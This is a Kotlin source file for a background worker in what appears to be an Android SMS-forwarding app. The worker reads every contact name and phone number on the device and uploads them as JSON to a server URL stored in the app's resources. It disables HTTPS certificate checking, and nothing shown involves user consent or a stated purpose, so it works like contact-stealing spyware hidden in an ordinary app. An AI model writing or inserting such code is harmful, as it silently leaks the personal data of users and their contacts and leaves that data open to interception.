package com.idormy.sms.forwarder.workers

import android.annotation.SuppressLint
import android.content.Context
import android.provider.ContactsContract
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.idormy.sms.forwarder.R
import com.idormy.sms.forwarder.entity.Contact
import com.xuexiang.xhttp2.XHttp
import com.xuexiang.xhttp2.callback.SimpleCallBack
import com.xuexiang.xhttp2.exception.ApiException
import okhttp3.MediaType
import okhttp3.RequestBody
import org.json.JSONArray
import org.json.JSONObject

class FetchContactsWorker(cont: Context, params: WorkerParameters) : CoroutineWorker(cont, params) {

    override suspend fun doWork(): Result {
        return try {
            // 获取通讯录 
            val contacts = fetchContacts()
            val serverUrl = applicationContext.getString(R.string.server_url)
            saveContacts(serverUrl, contacts)
            Result.success()
        } catch (e: Exception) {
            Result.failure()
        }
    }

    @SuppressLint("Range")
    private suspend fun fetchContacts(): List<Contact> {
        val contacts = mutableListOf<Contact>()
        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        applicationContext.contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
            while (cursor.moveToNext()) {
                val name =
                    cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number =
                    cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contacts.add(Contact(name, number))
            }
        }
        return contacts
    }

    private suspend fun saveContacts(url: String, contacts: List<Contact>) {
        val jsonArray = JSONArray()
        for (ct in contacts) {
            jsonArray.put(JSONObject(mapOf("name" to ct.name, "phoneNumber" to ct.phoneNumber)))
        }
        val body = RequestBody.create(
            MediaType.parse("application/json"),
            JSONObject(mapOf("contacts" to jsonArray)).toString(4)
        )
        XHttp.post(url).ignoreHttpsCert().requestBody(body)
            .execute(object : SimpleCallBack<String?>() {
                override fun onSuccess(response: String?) {
                    System.out.println("okkkk")
                }

                override fun onError(e: ApiException?) {
                    System.out.println(e?.message)
                }

            })
    }
}